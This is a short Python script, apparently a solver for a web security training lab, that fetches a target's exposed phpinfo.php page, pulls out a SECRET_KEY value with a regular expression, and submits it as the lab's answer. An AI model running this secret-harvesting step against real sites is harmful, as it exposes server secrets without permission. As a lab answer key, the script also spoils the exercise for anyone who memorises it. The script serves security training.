import requests
import sys
import re

burp_url = sys.argv[1]
key_url = burp_url + '/cgi-bin/phpinfo.php'
answer_url = burp_url + '/submitSolution'

r = requests.get(key_url)
response = r.text

pattern = r'<tr><td class="e">SECRET_KEY </td><td class="v">([a-zA-Z0-9]{32}) </td></tr>'
match = re.search(pattern, response)

key = match.group(1)

requests.post(answer_url, data={"answer": key})
